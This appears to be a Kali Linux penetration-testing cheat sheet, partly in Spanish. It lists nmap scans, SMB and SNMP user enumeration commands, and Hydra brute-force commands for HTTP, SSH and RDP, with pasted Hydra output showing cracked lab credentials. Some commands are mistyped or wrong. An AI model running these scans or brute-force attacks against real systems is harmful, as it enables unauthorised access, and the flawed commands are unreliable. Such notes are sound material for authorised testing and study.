#Kali-Help-Sheet

# TTY Shells
## Python TTY Shell Trick


# 🕵️ Recon and Enumeration

## 🌐 NMAP Commands

Nmap (“Network Mapper”) is a free and open-source utility for network discovery and security auditing. It's a versatile tool used by both systems and network administrators for tasks like network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X.

### Commands

| Command | Description |
|---------|-------------|
| `nmap -v -sS -A -T4 target` | Nmap verbose scan, runs syn stealth, T4 timing, OS and service version info, traceroute and scripts against services. |
| `ping sweep sudo nmap -pn target` | Does a ping sweep over the target's network to see all the available IPs. |
| `nmap -v -sS -p–A -T4 target` | As above but scans all TCP ports (takes a lot longer). |
| `nmap -v -sU -sS -p- -A -T4 target` | As above but scans all TCP ports and UDP scan (takes even longer). |
| `nmap -v -p 445 –script=smb-check-vulns --script-args=unsafe=1 192.168.1.X` | Nmap script to scan for vulnerable SMB servers. |
| `nmap localhost` | Displays all the ports that are currently in use. |
| `ls /usr/share/nmap/scripts/* | grep ftp` | Search nmap scripts for keywords. |

# 👤 Username Enumeration

## SMB User Enumeration

| Command | Description |
|---------|-------------|
| `python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.16X.XXX.XXX` | Enumerate users from SMB |
| `ridenum.py 192.16X.XXX.XXX 500 50000 dict.txt` | RID cycle SMB / enumerate users from SMB |
| `enum4linux -U 192.16X.XXX.XXX` | Enumerate SMB usernames using enum4linux |
## SNMP User Enumeration

| Command | Description |
|---------|-------------|
| `snmpwalk public -v1 192.168.X.XXX 1 | grep 77.1.2.25` | Enumerate users from SNMP |
| `python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX` | Enumerate users from SNMP |
| `nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt` | Search for SNMP servers with nmap, grepable output |

# 🔒 Passwords

## Wordlists

| Command | Description |
|---------|-------------|
| `/usr/share/wordlists` | Kali word lists |
| `wget https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt` | Download a popular wordlist from GitHub |

# 🐍 Hydra

## Bruteforce de contraseña con usuario que sabemos

`hydra -l <username> -P /usr/share/wordlists/rockyou.txt http://<IP_Address>`

## Bruteforce de usuario y contraseña
`hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt http://<IP_Address>`

## Bruteforce de SSH

| Command | Description |
|---------|-------------|
| `hydra -L username.list -P password.list ssh://10.129.202.136` | Bruteforce de SSH |
| Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). | |
| Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-08 09:41:16 | |
| `[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4` | |
| `[DATA] max 16 tasks per 1 server, overall 16 tasks, 21112 login tries (l:104/p:203), ~1320 tries per task` | |
| `[DATA] attacking ssh://10.129.202.136:22/` | |
| `[STATUS] 156.00 tries/min, 156 tries in 00:01h, 20958 to do in 02:15h, 14 active` | |
| `[22][ssh] host: 10.129.202.136   login: dennis   password: rockstar` | |

## Bruteforce de RDP

| Command | Description |
|---------|-------------|
| `hydra -L username.list -P password.list rdp://10.129.202.136` | Bruteforce de RDP |
| Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). | |
| Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-08 09:51:50 | |
| `[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover` | |
| `[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)` | |
| `[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.` | |
| `[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore` | |
| `[DATA] max 4 tasks per 1 server, overall 4 tasks, 21112 login tries (l:104/p:203), ~5278 tries per task` | |
| `[DATA] attacking rdp://10.129.202.136:3389/` | |
| `[3389][rdp] account on 10.129.202.136 might be valid but account not active for remote desktop: login: john password: november, continuing attacking the account.` | |

